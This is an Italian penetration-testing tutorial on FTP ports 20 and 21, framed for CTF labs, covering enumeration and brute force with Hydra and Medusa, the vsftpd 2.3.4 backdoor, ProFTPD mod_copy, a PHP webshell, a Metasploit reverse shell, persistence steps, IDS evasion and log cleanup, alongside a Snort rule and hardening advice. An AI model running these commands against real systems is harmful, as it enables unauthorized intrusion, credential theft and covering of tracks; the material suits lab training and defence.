---
title: 'FTP porte 20 e 21: cos’è il protocollo, come funziona e dove si attacca davvero'
slug: porta-ftp-20
description: 'Guida pratica alle porte FTP (File Transfer Protocol) 20 e 21: differenza tra control e data channel, active/passive mode, rischi di sniffing, FTP bounce e vulnerabilità comuni nei server legacy e nei lab.'
image: /ftp.webp
draft: true
date: 2026-04-03T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - ftp-data
---

La porta 20 è il canale dati del protocollo FTP in modalità attiva — e rappresenta uno dei vettori d'attacco più sottovalutati in ambiente lab e CTF. Ogni volta che un server FTP trasferisce file o directory listing in active mode, il traffico transita dalla porta 20 del server verso una porta alta del client, in chiaro. Questo significa **credenziali, file sensibili e configurazioni leggibili da chiunque intercetti il flusso**. In un pentest, la porta 20 non si attacca direttamente: si sfrutta attraverso la porta 21 (canale comandi), abusando della relazione tra i due canali per ottenere accesso, esfiltrare dati e pivotare nella rete interna.

FTP resta presente nel 2026 per sistemi legacy, dispositivi IoT con risorse limitate e workflow enterprise consolidati. Nei laboratori e nelle CTF, server come vsftpd 2.3.4 e ProFTPD 1.3.5 vengono deliberatamente deployati con misconfigurazioni che trasformano la porta 20/21 in un entry point diretto verso una shell root. Questa guida copre l'intera kill chain: dalla reconnaissance con [nmap](https://hackita.it/articoli/nmap) fino alla post-exploitation, con comandi copy-paste e output reali.

***

## Come funziona il doppio canale FTP

FTP è l'unico protocollo mainstream che utilizza **due connessioni TCP separate**: porta 21 per i comandi, porta 20 per i dati. Comprendere questa architettura è fondamentale per sfruttarla.

**Active mode — il flusso completo:**

1. Il client si connette dalla porta N (>1024) alla **porta 21** del server — canale comandi
2. Il client invia il comando `PORT h1,h2,h3,h4,p1,p2` specificando IP e porta su cui ricevere dati
3. Il server apre una connessione **dalla sua porta 20** verso la porta del client (p1×256+p2)
4. Il trasferimento avviene, la connessione dati si chiude; un nuovo trasferimento richiede una nuova connessione

**Passive mode — differenza chiave:**

1. Il client invia `PASV` invece di `PORT`
2. Il server risponde con un IP e una porta alta random (49152–65535)
3. Il client si connette a quella porta — **la porta 20 non viene mai usata**

| Modalità | Comando | Chi inizia il data channel | Porta dati server |
| -------- | ------- | -------------------------- | ----------------- |
| Attiva   | `PORT`  | Server → Client            | **20**            |
| Passiva  | `PASV`  | Client → Server            | Random alta       |

**Perché questo conta in un pentest:** in active mode, il server deve poter aprire connessioni verso il client. Molti firewall aziendali devono quindi aprire porte o usare moduli ALG (Application Layer Gateway) per ispezionare i comandi PORT — creando attack surface aggiuntiva. La trasmissione in chiaro sul canale dati espone ogni file trasferito a sniffing.

Le **misconfigurazioni comuni** sulla porta 20 includono: permettere il comando PORT verso IP arbitrari (abilitando il [FTP bounce](https://hackita.it/articoli/ftp-bounce)), non restringere il range di porte passive, assenza di TLS sul canale dati e server FTP eseguiti con privilegi root.

***

## Enumerazione base con nmap e netcat

Il primo passo è identificare la versione del servizio FTP e verificare se l'accesso anonimo è abilitato. La porta 20 risulterà quasi sempre `closed` in uno scan — il target primario è la porta 21.

```bash
nmap -sV -sC -p 20,21 10.10.10.3
```

```
PORT   STATE  SERVICE VERSION
20/tcp closed ftp-data
21/tcp open   ftp     vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0     65534    4096 Apr 12  2023 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

**Parametri:** `-sV` rileva la versione del servizio, `-sC` esegue gli script NSE di default (`ftp-anon`, `ftp-bounce`, `ftp-syst`), `-p 20,21` limita lo scan alle porte FTP.

L'output rivela tre informazioni critiche: la versione **vsftpd 2.3.4** (notoriamente backdoorata), l'accesso **anonymous abilitato** e la directory `pub` accessibile.

**Banner grabbing alternativo con netcat:**

```bash
nc -vn 10.10.10.3 21
```

```
(UNKNOWN) [10.10.10.3] 21 (ftp) open
220 (vsFTPd 2.3.4)
```

**Parametri:** `-v` output verbose, `-n` nessuna risoluzione DNS. La risposta `220` conferma il servizio attivo e espone la versione nel banner.

***

## Enumerazione avanzata: NSE, fingerprinting e brute force

Dopo aver identificato il servizio, si passa allo scan completo con tutti gli script NSE per FTP. Nmap include **8 script specifici** per il protocollo FTP.

```bash
nmap --script=ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-syst -p 21 10.10.10.3
```

**Tabella script NSE per FTP**

| Script                  | Categoria       | Funzione                                       |
| ----------------------- | --------------- | ---------------------------------------------- |
| `ftp-anon`              | default, safe   | Verifica login anonimo e lista directory       |
| `ftp-bounce`            | default, safe   | Testa FTP bounce attack via comando PORT       |
| `ftp-syst`              | default, safe   | Fingerprinting con comandi SYST e STAT         |
| `ftp-brute`             | intrusive       | Brute force credenziali FTP                    |
| `ftp-vsftpd-backdoor`   | exploit, vuln   | Testa backdoor vsftpd 2.3.4 (CVE-2011-2523)    |
| `ftp-proftpd-backdoor`  | exploit, vuln   | Testa backdoor ProFTPD 1.3.3c (BID 45150)      |
| `ftp-vuln-cve2010-4221` | intrusive, vuln | Testa buffer overflow ProFTPD (CVSS 10.0)      |
| `ftp-libopie`           | vuln            | Testa CVE-2010-1938 — **crasherà il servizio** |

**Brute force con Hydra:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f ftp://10.10.10.3
```

```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries
[DATA] attacking ftp://10.10.10.3:21/
[21][ftp] host: 10.10.10.3   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

**Parametri:** `-l admin` utente singolo, `-P` dizionario password, `-t 4` massimo 4 thread paralleli (vsftpd ha anti-brute-force integrato con `max_login_fails` default 3), `-f` si ferma al primo match.

**Alternativa con Medusa:**

```bash
medusa -h 10.10.10.3 -U users.txt -P passwords.txt -M ftp -t 8
```

```
ACCOUNT FOUND: [ftp] Host: 10.10.10.3 User: admin Password: admin123 [SUCCESS]
```

***

## Tecniche offensive per FTP in ambiente CTF

Le tecniche offensive su FTP si dividono in tre categorie: abuso di funzionalità legittime, exploitation di vulnerabilità note e sfruttamento di misconfigurazioni.

**Credenziali di default da testare sempre:**

In un ambiente CTF, prima del brute force provare manualmente le combinazioni più comuni: `anonymous`/vuoto, `ftp`/`ftp`, `admin`/`admin`, `root`/`root`, `ftpuser`/`password`. I server FTP non hanno password di default proprie — autenticano contro gli account di sistema — ma i device embedded (APC UPS, Schneider PLC, Beijer HMI) spesso usano credenziali hardcoded come `device`/`apc` o `sysdiag`/`factorycast@schneider`.

**Accesso anonimo con upload:** se il login anonimo è abilitato con permessi di scrittura, caricare una [webshell](https://hackita.it/articoli/webshell) nella directory del web server rappresenta un path diretto verso RCE:

```bash
ftp 10.10.10.50
# login: anonymous / (vuoto)
ftp> cd /var/www/html
ftp> put shell.php
ftp> bye
```

```bash
curl "http://10.10.10.50/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

**FTP bounce attack — scansione della rete interna:**

```bash
nmap -Pn -v -p 22,80,443,445 -b ftp:ftp@10.2.1.5 192.168.0.0/24
```

Il server FTP vulnerabile al bounce diventa un proxy per scansionare host interni non raggiungibili direttamente. Il comando `PORT` viene manipolato per far connettere il server FTP a un host e porta arbitrari, e dall'esito della risposta si determina se la porta è aperta.

***

## Tre scenari pratici da lab e CTF

### Scenario 1 — File sensibili via anonymous FTP

**Contesto:** macchina CTF con vsftpd 3.0.3 e accesso anonimo abilitato.

```bash
nmap -sV -sC -p 21 10.10.10.50
```

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 1001   1001     4096 Mar 15  2024 confidential
|_-rw-r--r--    1 0      0         854 Mar 15  2024 welcome.txt
```

```bash
ftp 10.10.10.50
# Name: anonymous | Password: (invio)
ftp> ls -la confidential/
-rw-r--r--    1 1001    1001      312 Mar 15  2024 credentials.bak
-rw-r--r--    1 1001    1001     1247 Mar 15  2024 wp-config.php.bak
ftp> get confidential/credentials.bak
ftp> bye
```

```bash
cat credentials.bak
# SSH: admin / S3cur3P@ss!
# MySQL: root / dbr00tpass
```

```bash
ssh admin@10.10.10.50
# password: S3cur3P@ss!
admin@target:~$ sudo -l
# (ALL : ALL) ALL
admin@target:~$ sudo su
root@target:~# cat /root/flag.txt
# CTF{ftp_an0n_cr3d_l3ak}
```

**Lezione:** l'accesso anonimo FTP espone file di backup con credenziali in chiaro che permettono accesso SSH e privilege escalation diretta.

### Scenario 2 — Backdoor vsftpd 2.3.4 (CVE-2011-2523)

**Contesto:** la backdoor si attiva inviando un username contenente `:)` (smiley). Il server apre una bind shell sulla **porta 6200** con privilegi root.

```bash
nmap --script=ftp-vsftpd-backdoor -p 21 10.10.10.3
```

**Exploitation manuale — Terminale 1 (trigger):**

```bash
nc -vn 10.10.10.3 21
# 220 (vsFTPd 2.3.4)
USER nergal:)
# 331 Please specify the password.
PASS qualsiasi
# (connessione in hang — backdoor attivata)
```

**Terminale 2 (shell):**

```bash
nc -vn 10.10.10.3 6200
# (UNKNOWN) [10.10.10.3] 6200 (?) open
id
# uid=0(root) gid=0(root)
cat /root/proof.txt
# CTF{vsftpd_backd00r_pwn3d}
```

**Con [Metasploit](https://hackita.it/articoli/metasploit):**

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
run
# [+] Backdoor service has been spawned, handling...
# [+] UID: uid=0(root) gid=0(root)
```

**Meccanismo:** il codice malevolo inserito nel sorgente controlla byte per byte l'username. Quando trova `0x3A` (`:`) seguito da `0x29` (`)`) invoca `vsf_sysutil_extra()`, che apre un listener sulla porta 6200 come root.

### Scenario 3 — ProFTPD 1.3.5 mod\_copy (CVE-2015-3306)

**Contesto:** il modulo `mod_copy` permette di copiare file sul filesystem senza autenticazione tramite `SITE CPFR` e `SITE CPTO`.

```bash
nc -vn 10.10.10.80 21
# 220 ProFTPD 1.3.5 Server (Debian)
SITE CPFR /etc/passwd
# 350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/passwd.txt
# 250 Copy successful
```

```bash
curl http://10.10.10.80/passwd.txt
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:...
```

**Escalation a RCE con webshell:**

```bash
# Creare un file PHP nel web root
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php
# Oppure usare SITE CPFR/CPTO per copiare un file con payload PHP

curl "http://10.10.10.80/cmd.php?cmd=id"
# uid=65534(nobody) gid=65534(nogroup)
```

**Con Metasploit:**

```bash
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.10.10.80
set SITEPATH /var/www/html
set payload cmd/unix/reverse_perl
set LHOST 10.10.14.2
run
# [*] Command shell session 1 opened
```

***

## Toolchain integration: dalla recon alla post-exploitation

**Tabella comparativa degli strumenti**

| Fase    | Tool                                              | Comando                                            | Scopo                              |
| ------- | ------------------------------------------------- | -------------------------------------------------- | ---------------------------------- |
| Recon   | nmap                                              | `nmap -sV -sC -p 21`                               | Version detection + script default |
| Recon   | netcat                                            | `nc -vn target 21`                                 | Banner grabbing rapido             |
| Enum    | nmap NSE                                          | `--script=ftp-anon,ftp-bounce`                     | Check accesso anonimo e bounce     |
| Enum    | searchsploit                                      | `searchsploit vsftpd 2.3.4`                        | Ricerca exploit locali             |
| Brute   | [Hydra](https://hackita.it/articoli/searchsploit) | `hydra -L users.txt -P pass.txt ftp://target`      | Brute force parallelo              |
| Brute   | [Medusa](https://hackita.it/articoli/medusa)      | `medusa -h target -U users.txt -P pass.txt -M ftp` | Alternativa a Hydra                |
| Exploit | Metasploit                                        | `use exploit/unix/ftp/vsftpd_234_backdoor`         | Exploitation automatizzata         |
| Exploit | [netcat](https://hackita.it/articoli/netcat)      | `nc -vn target 6200`                               | Connessione shell manuale          |
| Post    | python3                                           | `python3 -c 'import pty;pty.spawn("/bin/bash")'`   | Stabilizzazione shell              |
| Pivot   | nmap                                              | `nmap -b ftp:ftp@relay target_interno`             | Bounce scan rete interna           |

La pipeline operativa segue un flusso lineare: **nmap** identifica il servizio → **script NSE** enumera vulnerabilità e accesso anonimo → **searchsploit** verifica exploit disponibili → **Hydra/Metasploit** attacca → **netcat** stabilisce la connessione → strumenti di [privilege escalation](https://hackita.it/articoli/privilege-escalation) completano la catena.

***

## Attack chain completa: dal primo scan alla persistenza

```
RECON
├── nmap -sV -sC -p 20,21 <target>           → Versione + anonymous + bounce
├── nc -vn <target> 21                         → Banner grab
└── searchsploit <versione_ftp>                → Exploit noti

INITIAL ACCESS
├── A) Anonymous login → download file sensibili → credenziali SSH
├── B) vsftpd 2.3.4 → trigger :) → root shell porta 6200
├── C) ProFTPD 1.3.5 → SITE CPFR/CPTO → webshell → RCE
├── D) Upload in dir web condivisa → webshell → RCE
└── E) Brute force → hydra/medusa → accesso con credenziali valide

PRIVILEGE ESCALATION
├── sudo -l                                    → Check sudo misconfiguration
├── find / -perm -4000 2>/dev/null             → SUID binaries
├── cat /etc/crontab                           → Cron job abuse
└── uname -a → searchsploit <kernel>           → Kernel exploit

PERSISTENCE
├── echo '<ssh_key>' >> ~/.ssh/authorized_keys  → SSH backdoor
├── useradd -m -s /bin/bash -G sudo hacker     → Nuovo utente privilegiato
└── crontab -e → reverse shell periodica        → Cron persistence

PIVOT
├── nmap -b ftp:ftp@<server_compromesso> <rete_interna>
└── Tunnel via SSH o chisel per accesso alla rete interna
```

***

## Detection e tecniche di evasione

**Lato blue team**, i log FTP sono la prima linea di difesa. vsftpd scrive su `/var/log/vsftpd.log` (con `xferlog_enable=YES`); il formato xferlog registra timestamp, IP remoto, dimensione file, nome file, direzione del trasferimento e utente. ProFTPD logga su `/var/log/proftpd/`. I segnali d'allarme critici: **multiple risposte 530** (brute force), login anonymous da IP esterni, comandi `SITE CPFR/CPTO` (mod\_copy abuse), connessioni alla porta 6200 (vsftpd backdoor).

Regole Snort/Suricata per rilevare brute force FTP:

```
alert tcp $HOME_NET 21 -> $EXTERNAL_NET any (msg:"FTP Brute Force"; content:"530 "; depth:4; detection_filter:track by_src, count 5, seconds 60; sid:1000020;)
```

**Lato red team**, per ridurre il rumore e evitare detection:

```bash
# Scan lento — evita threshold IDS (1 probe ogni 20 secondi)
nmap -T1 --scan-delay 20s --max-parallelism 1 -p 21 10.10.10.3

# Source port spoofing — sfrutta firewall che fidano traffico da porta 20
nmap --source-port 20 -p 21 10.10.10.3

# Brute force rallentato — single thread con pausa di 30 secondi
hydra -l admin -P passwords.txt -t 1 -W 30 ftp://10.10.10.3

# Decoy scan — confonde i log con IP falsi
nmap -D RND:5 -p 21 10.10.10.3
```

**Parametri chiave:** `-T1` (sneaky) inserisce 15 secondi tra probe, `--scan-delay 20s` supera il threshold Snort di 15 probe in 15 secondi, `--source-port 20` sfrutta regole firewall permissive sulla porta dati FTP, `-D RND:5` genera 5 IP decoy casuali.

***

## Performance e ottimizzazione multi-target

Per un singolo target, la scansione completa con tutti gli script NSE richiede circa **15-30 secondi**. Su reti più ampie, l'ottimizzazione diventa critica:

```bash
# Scansione singola completa
nmap -sV --script=ftp-* -p 21 10.10.10.3

# Multi-target: prima discovery veloce, poi scan mirato
nmap -T4 --open -p 21 10.10.10.0/24 -oG ftp_hosts.txt
grep "21/open" ftp_hosts.txt | awk '{print $2}' > targets.txt
nmap -sV --script=ftp-anon,ftp-vsftpd-backdoor -p 21 -iL targets.txt

# Brute force parallelo su più host
hydra -L users.txt -P top100.txt -M targets.txt ftp -t 4
```

**Parametri:** `-T4` (aggressive) velocizza il discovery iniziale, `--open` mostra solo porte aperte, `-oG` output grepable, `-iL` legge target da file. Usare dizionari ridotti (`top100.txt`) per il primo pass e ampliare solo sui target promettenti.

***

## Troubleshooting: errori frequenti e soluzioni

| Errore                              | Causa                                                                    | Fix                                       |
| ----------------------------------- | ------------------------------------------------------------------------ | ----------------------------------------- |
| `Connection refused` sulla porta 20 | La porta 20 si attiva solo durante trasferimenti in active mode          | Scansionare la porta 21, non la 20        |
| `425 Can't open data connection`    | Firewall blocca il canale dati o mismatch active/passive                 | `ftp> passive` per switchare modalità     |
| `425 Security: Bad IP connecting`   | vsftpd verifica che l'IP del data channel corrisponda al control channel | Problema NAT — usare passive mode         |
| `530 Login incorrect`               | Credenziali errate o utente in `/etc/ftpusers` deny list                 | Provare `anonymous`, verificare deny list |
| `ls` o `get` in hang                | Canale dati bloccato dal firewall                                        | `ftp -p target` forza passive mode        |
| Nmap non rileva versione            | Server con banner personalizzato o `ServerIdent off`                     | Usare `nc` per banner grab manuale        |
| Hydra troppo lento                  | vsftpd `delay_failed_login` (default 1s) + `max_login_fails` (default 3) | Ridurre a `-t 1`, usare dizionari mirati  |

***

## FAQ — domande pratiche

**La porta 20 è sempre aperta su un server FTP?**
No. La porta 20 si attiva solo in active mode durante un trasferimento dati. Negli scan risulterà quasi sempre `closed` o `filtered`. L'entry point per l'enumerazione FTP è sempre la porta 21.

**Che differenza c'è tra porta 20 e porta 21?**
La porta 21 è il canale comandi (persistente per tutta la sessione), la porta 20 è il canale dati usato solo in active mode. In passive mode la porta 20 non viene coinvolta — il server apre una porta alta random.

**Come verifico se un server è vulnerabile al bounce attack?**
Usare `nmap --script ftp-bounce -p 21 target`. Se l'output riporta `bounce working!`, il server accetta comandi PORT verso IP arbitrari e può essere usato come proxy per scansionare reti interne.

**Posso attaccare FTP solo con strumenti da CLI senza Metasploit?**
Sì. La backdoor vsftpd 2.3.4 si sfrutta con due istanze di `nc`: una per triggerare il smiley `:)` sulla porta 21, l'altra per connettersi alla porta 6200. Il mod\_copy di ProFTPD si sfrutta interamente da netcat con `SITE CPFR` e `SITE CPTO`.

**Il brute force su FTP è efficace?**
Dipende dalla configurazione. vsftpd implementa anti-brute-force di default: 3 tentativi massimi per connessione con 1 secondo di delay. Hydra aggira questo riconnettendosi, ma il processo resta lento. In CTF, prima tentare sempre credenziali di default e accesso anonimo.

**Come distinguo vsftpd da ProFTPD dal banner?**
Il banner rivela il software: `220 (vsFTPd 2.3.4)` oppure `220 ProFTPD 1.3.5 Server (Debian)`. Se il banner è nascosto, usare `nmap -sV` per fingerprinting oppure il comando FTP `SYST` dopo login.

**FTP su TLS (FTPS) è sicuro?**
FTPS cifra il canale ma mantiene l'architettura dual-channel che complica il firewalling. SFTP (porta 22, protocollo SSH) è l'alternativa preferita: connessione singola, cifratura forte, autenticazione con chiavi.

***

## Cheat sheet finale

| Azione                         | Comando                                                                      |
| ------------------------------ | ---------------------------------------------------------------------------- |
| Scan versione + script default | `nmap -sV -sC -p 21 <target>`                                                |
| Banner grab                    | `nc -vn <target> 21`                                                         |
| Check anonymous                | `nmap --script=ftp-anon -p 21 <target>`                                      |
| Scan tutte le vuln FTP         | `nmap --script=ftp-* -p 21 <target>`                                         |
| Test vsftpd backdoor           | `nmap --script=ftp-vsftpd-backdoor -p 21 <target>`                           |
| Test ProFTPD backdoor          | `nmap --script=ftp-proftpd-backdoor -p 21 <target>`                          |
| Test bounce                    | `nmap --script=ftp-bounce -p 21 <target>`                                    |
| Brute force (Hydra)            | `hydra -l admin -P rockyou.txt ftp://<target>`                               |
| Brute force (Medusa)           | `medusa -h <target> -U users.txt -P pass.txt -M ftp`                         |
| Bounce scan rete interna       | `nmap -b ftp:ftp@<relay> <target_interno>`                                   |
| Login manuale                  | `ftp <target>`                                                               |
| Passive mode forzato           | `ftp -p <target>`                                                            |
| Trigger backdoor vsftpd        | `nc <target> 21` → `USER x:)` → `nc <target> 6200`                           |
| Exploit mod\_copy              | `nc <target> 21` → `SITE CPFR /etc/passwd` → `SITE CPTO /var/www/html/p.txt` |
| Cerca exploit                  | `searchsploit <ftp_version>`                                                 |
| Stabilizza shell               | `python3 -c 'import pty;pty.spawn("/bin/bash")'`                             |
| Scan lento (evasione IDS)      | `nmap -T1 --scan-delay 20s -p 21 <target>`                                   |

***

## Perché la porta 20 FTP resta rilevante nel 2026

Nonostante browser come Chrome e Firefox abbiano rimosso il supporto FTP nel 2021 e protocolli come SFTP e SCP offrano cifratura nativa, FTP sopravvive. Le ragioni sono concrete: **sistemi legacy** dove la migrazione è troppo costosa, **dispositivi embedded e IoT** con risorse computazionali insufficienti per gestire SSH, workflow enterprise di scambio dati EDI consolidati da decenni e reti interne isolate dove il rischio di intercettazione è considerato accettabile. In ambito CTF e certificazioni OSCP, FTP rappresenta uno dei servizi più frequentemente testati, con macchine come Metasploitable 2 (vsftpd 2.3.4) e Lame di HackTheBox che hanno insegnato il pentest FTP a un'intera generazione di professionisti.

## Hardening rapido per difendere un server FTP

Per chi gestisce un server FTP in produzione: **disabilitare l'accesso anonimo** (`anonymous_enable=NO` in vsftpd.conf), **abilitare TLS** (`ssl_enable=YES`, `ssl_ciphers=HIGH`), chrootare gli utenti (`chroot_local_user=YES`), limitare le connessioni per IP (`max_per_ip=5`), restringere il range porte passive (`pasv_min_port=40000`, `pasv_max_port=40100`) e nascondere il banner di versione. Per ProFTPD: `DefaultRoot ~`, `MaxLoginAttempts 5`, `ServerIdent on "FTP Server"` (senza versione) e il modulo `mod_tls` con TLS 1.2+.

## OPSEC: come non farsi rilevare

In operazioni autorizzate, la stealth si ottiene con tre accorgimenti: **timing controllato** (`-T1` o `--scan-delay 20s` su nmap, `-t 1 -W 30` su Hydra), **source port spoofing** dalla porta 20 per abusare di regole firewall che fidano il traffico FTP-Data, e **pulizia post-operazione** rimuovendo shell uploadate e, se possibile in ambiente lab, i log di accesso. In una CTF la stealth non è necessaria, ma allenarsi con queste tecniche prepara a scenari reali.

***

> **Disclaimer:** Tutti i comandi e le tecniche descritte in questo articolo sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine CTF e penetration test con autorizzazione scritta. L'accesso non autorizzato a sistemi informatici è un reato penale. L'autore e HackIta declinano ogni responsabilità per usi impropri di queste informazioni.

Leggi la guida completa qui: [https://it.wikipedia.org/wiki/File\_Transfer\_Protocol](https://it.wikipedia.org/wiki/File_Transfer_Protocol)
